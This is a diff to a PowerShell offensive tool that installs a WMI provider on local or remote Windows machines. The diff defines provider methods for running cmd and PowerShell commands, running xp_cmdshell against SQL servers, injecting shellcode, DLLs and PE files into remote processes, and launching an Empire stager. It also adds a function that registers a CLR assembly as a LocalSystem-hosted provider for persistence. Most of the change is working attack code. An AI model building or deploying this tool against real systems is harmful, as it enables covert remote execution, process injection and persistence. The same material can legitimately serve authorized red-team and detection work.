@@ -171,7 +171,7 @@ Function Install-WMIProviderPowerShell {
 ################################################################################
 # Register WMI Provider Method
 ################################################################################
-Function Install-WMIProvider {
+Function Install-WMIProviderFull {
 <#
 	.SYNOPSIS
 	
@@ -186,12 +186,12 @@ Function Install-WMIProvider {
 
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
             [string]$Target = ".",
-        [Parameter(Mandatory=$true, HelpMessage="Class where payload is stored.")]
+        [Parameter(Mandatory=$true, HelpMessage=".")]
             [string]$ClassName,
-        [Parameter(Mandatory=$true, HelpMessage="Class where payload is stored.")]
-            [string]$Provider,
+        #[Parameter(Mandatory=$true, HelpMessage=".")]
+        #    [string]$Provider,
         [Parameter(Mandatory=$false, HelpMessage=".")]
             [string]$Username,
         [Parameter(Mandatory=$false, HelpMessage=".")]
@@ -200,46 +200,129 @@ Function Install-WMIProvider {
             [SecureString]$SecurePassword
     )
     Begin {
-        $Class = New-WMIProviderClass -Target $Target -UserName $UserName -Password $Password -SecurePassword $SecurePassword
+        $Class = New-WMIProviderClass -Target $Target -ClassName $ClassName -UserName $UserName -Password $Password -SecurePassword $SecurePassword
 
-        $command = New-MethodParameter -Direction "In" -Property "command" -CimType String
+        $command = New-WMIMethodParameter -Direction "In" -Property "command" -CimType String
 
-        $parameters = New-MethodParameter -Direction "In" -Property "parameters" -CimType String
+        $parameters = New-WMIMethodParameter -Direction "In" -Property "parameters" -CimType String
         
-        $server = New-MethodParameter -Direction "In" -Property "server" -CimType String
-        $database = New-MethodParameter -Direction "In" -Property "database" -CimType String
-        $username = New-MethodParameter -Direction "In" -Property "username" -CimType String
-        $password = New-MethodParameter -Direction "In" -Property "password" -CimType String
+        $server = New-WMIMethodParameter -Direction "In" -Property "server" -CimType String
+        $database = New-WMIMethodParameter -Direction "In" -Property "database" -CimType String
+        $sqlusername = New-WMIMethodParameter -Direction "In" -Property "username" -CimType String
+        $sqlpassword = New-WMIMethodParameter -Direction "In" -Property "password" -CimType String
 
-        $shellcode = New-MethodParameter -Direction "In" -Property "shellCodeString" -CimType String  
+        $shellcode = New-WMIMethodParameter -Direction "In" -Property "shellCodeString" -CimType String  
         
-        $processId = New-MethodParameter -Direction "In" -Property "processId" -CimType SInt32    
+        $processId = New-WMIMethodParameter -Direction "In" -Property "processId" -CimType SInt32    
 
-        $fileName = New-MethodParameter -Direction "In" -Property "fileName" -CimType String
+        $library = New-WMIMethodParameter -Direction "In" -Property "library" -CimType String
+
+        $fileName = New-WMIMethodParameter -Direction "In" -Property "fileName" -CimType String
         
-        $server = New-MethodParameter -Direction "In" -Property "server" -CimType String
-        $stagingKey = New-MethodParameter -Direction "In" -Property "stagingKey" -CimType String
-        $language = New-MethodParameter -Direction "In" -Property "language" -CimType String 
+        $server = New-WMIMethodParameter -Direction "In" -Property "server" -CimType String
+        $stagingKey = New-WMIMethodParameter -Direction "In" -Property "stagingKey" -CimType String
+        $language = New-WMIMethodParameter -Direction "In" -Property "language" -CimType String 
 
-        $output = New-MethodParameter -Direction "Out" -Property "output" -CimType String
+        $output = New-WMIMethodParameter -Direction "Out" -Property "output" -CimType String
     } Process {
         Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "RunCMD" -MethodInParameters @($command, $parameters) -MethodOutParameters @($output)
         Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "RunPowerShell" -MethodInParameters @($command) -MethodOutParameters @($output)
-        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "RunXPCmdShell" -MethodInParameters @($server, $database, $username, $password, $command) -MethodOutParameters @($output)
+        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "RunXPCmdShell" -MethodInParameters @($server, $database, $sqlusername, $sqlpassword, $command) -MethodOutParameters @($output)
         Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "InjectShellCode" -MethodInParameters @($shellcode) -MethodOutParameters @($output)
         Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "InjectShellCodeRemote" -MethodInParameters @($shellcode, $processId) -MethodOutParameters @($output)
         Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "InjectDll" -MethodInParameters @($library) -MethodOutParameters @($output)
         Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "InjectDllRemote" -MethodInParameters @($library, $processId) -MethodOutParameters @($output)
+        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "InjectPeFromFileRemote" -MethodInParameters @($processId, $fileName, $parameters) -MethodOutParameters @($output)
         Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "EmpireStager" -MethodInParameters @($server, $stagingKey, $language) -MethodOutParameters @($output)
+    } End { 
+        #$Class.Put()
+    }
+}
+
+################################################################################
+# Register WMI Provider Method
+################################################################################
+Function Install-WMIProviderExtention {
+<#
+	.SYNOPSIS
+	    Installs the WMI Provider as an extention in ROOT/cimv2/WMI_extention.
+        This is a considerably simpler install process.
+	.PARAMETER Target
+        System to to register WMI provider on
+    .PARAMETER Username
+        Username to authenticate to remote system. 
+        Not required for pass-through authentication.
+    .PARAMETER Password
+        Password to authenticate to remote system. 
+        Not required for pass-through authentication.
+    .PARAMETER SecurePassword
+        Password stored as secure string to authenticate to remote system. 
+        Not required for pass-through authentication.
+    .PARAMETER ClassName
+        Name of WMI class to install on remote system.
+    .PARAMETER CLRVersion
+        CLR version of the library to be installed.
+    .PARAMETER PublicKeyToken
+        Public key token of the signed library.
+    .PARAMETER LibraryLocation
+	    Path to the library
+	.EXAMPLE
+
+#>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
+            [string]$Target = ".",
+        #[Parameter(Mandatory=$true, HelpMessage=".")]
+        #    [string]$Provider,
+        [Parameter(Mandatory=$false, HelpMessage=".")]
+            [string]$Username,
+        [Parameter(Mandatory=$false, HelpMessage=".")]
+            [string]$Password,
+        [Parameter(Mandatory=$false, HelpMessage=".")]
+            [SecureString]$SecurePassword,
+        [Parameter(Mandatory=$true, HelpMessage=".")]
+            [string]$ClassName,
+        [Parameter(Mandatory=$false, HelpMessage=".")]
+            [ValidateSet ("2.0.50727", "3.0", "3.5", "v4.0.30319")]
+            [string]$CLRVersion,
+        [Parameter(Mandatory=$false, HelpMessage=".")]
+            [string]$PublicKeyToken,
+        [Parameter(Mandatory=$true, HelpMessage=".")]
+            [string]$LibraryLocation = "$env:windir\system32\wbem\$ClassName.dll"
+    )
+    Begin {
+        if ($Username)
+        {
+            if ($Password)
+            {
+                [SecureString]$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
+            } 
+            $ConnectionOptions.Username = $Username
+            $ConnectionOptions.SecurePassword = [SecureString]$SecurePassword
+        }
+        else
+        {
+            $ConnectionOptions.Impersonation = [System.Management.ImpersonationLevel]::Impersonate;
+        }
+        $Scope = New-Object System.Management.ManagementScope("\\$Target\root\cimv2", $ConnectionOptions);
+        $Class = New-Object System.Management.ManagementClass($Scope, "__Win32Provider", $null);
+    
+    } Process {
+        $Class.Properties.Add("AssemblyName", "$ClassName, Version=1.0.0.0, Culture=neutral, PublicKeyToken=$PublicKeyToken")
+        $Class.Properties.Add("AssemblyPath", "file:///$($LibraryLocation -replace "\\","/")")
+        $Class.Properties.Add("CLRVersion", $CLRVersion)
+        $Class.Properties.Add("HostingModel", "LocalSystemHost:CLR")
+        $Class.Properties.Add("Name", "$ClassName, Version=1.0.0.0, Culture=neutral, PublicKeyToken=$PublicKeyToken")
     } End { 
         $Class.Put()
     }
 }
 
-
 ################################################################################
 ################################################################################
-Function New-MethodParameter {
+Function New-WMIMethodParameter {
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$True, HelpMessage="Method to add.")] 
@@ -276,7 +359,9 @@ Function local:Add-WMIProviderClassMethod {
         $OutParameters = New-Parameters -Direction Out
     } Process {
         $Index = 0
+        $MethodInParameters | ft
         $MethodInParameters | ForEach-Object {
+            $_ | ft
             Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction $_.Direction -Index $Index -Property $_.Property -CimType $_.CimType
             $Index++
         }
@@ -292,69 +377,6 @@ Function local:Add-WMIProviderClassMethod {
     }
 }
 
-
-################################################################################
-# Don't know what this does
-################################################################################
-Function Install-WMIProviderManual {
-<#
-	.SYNOPSIS
-	
-	.PARAMETER Target
-    
-    .PARAMETER Payload
-
-    .PARAMETER ClassName
-
-    .PARAMETER Destination
-	
-	.EXAMPLE
-#>
-
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
-            [string]$Target = ".",
-        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
-            [string]$Payload,
-        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
-            [string]$ClassName = "WMIFS",
-        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
-            [string]$Library = "$env:windir\system32\wbem\"
-    )
-    Begin {
-        
-        
-    } Process {
-        # Add all properties/parameters needed for provider
-        $InParametersManagementBaseObjectInstance = Get-ManagementBaseObject -Parameters $InParameters
-        $OutParametersManagementBaseObjectInstance = Get-ManagementBaseObject -Parameters $OutParameters
-
-        
-        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 1 -Property "parameters"-CimType ([System.Management.CimType]::String)
-        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 2 -Property "server" -CimType ([System.Management.CimType]::String)
-        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 3 -Property "database" -CimType ([System.Management.CimType]::String)
-        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 4 -Property "username" -CimType ([System.Management.CimType]::String)
-        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 5 -Property "password" -CimType ([System.Management.CimType]::String)
-        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 6 -Property "shellCodeString" -CimType ([System.Management.CimType]::String)
-        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 7 -Property "processId" -CimType ([System.Management.CimType]::SInt32)
-        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 8 -Property "library" -CimType ([System.Management.CimType]::String)
-        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 9 -Property "fileName" -CimType ([System.Management.CimType]::String)
-        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 10 -Property "stagingKey" -CimType ([System.Management.CimType]::String)
-        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction In -Index 11 -Property "language" -CimType ([System.Management.CimType]::String)
-
-        Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction Out -Index 12 -Property "output" -CimType ([System.Management.CimType]::String)
-
-        # Add all properties/parameters needed for provider
-        Add-WMIProviderClassMethod -Class $Class
-
-
-        # Add all metheds
-        # Put the class
-    } End { 
-        
-    }
-}
 
 ################################################################################
 ################################################################################
@@ -405,21 +427,21 @@ Function local:New-WMIProviderClass {
     )
     $Target = "."
     $ConnectionOptions = New-Object System.Management.ConnectionOptions;
-        if ($Username)
+    if ($Username)
+    {
+        if ($Password)
         {
-            if ($Password)
-            {
-                [SecureString]$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
-            } 
-            $ConnectionOptions.Username = $Username
-            $ConnectionOptions.SecurePassword = [SecureString]$SecurePassword
-        }
-        else
-        {
-            $ConnectionOptions.Impersonation = [System.Management.ImpersonationLevel]::Impersonate;
-        }
-        $Scope = New-Object System.Management.ManagementScope("\\$Target\root\cimv2", $ConnectionOptions);
-        $Class = New-Object System.Management.ManagementClass($Scope, "__Win32Provider", $null);
+            [SecureString]$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
+        } 
+        $ConnectionOptions.Username = $Username
+        $ConnectionOptions.SecurePassword = [SecureString]$SecurePassword
+    }
+    else
+    {
+        $ConnectionOptions.Impersonation = [System.Management.ImpersonationLevel]::Impersonate;
+    }
+    $Scope = New-Object System.Management.ManagementScope("\\$Target\root\cimv2", $ConnectionOptions);
+    $Class = New-Object System.Management.ManagementClass($Scope, "__Win32Provider", $null);
 
     $Guid = [System.Guid]::NewGuid()
 
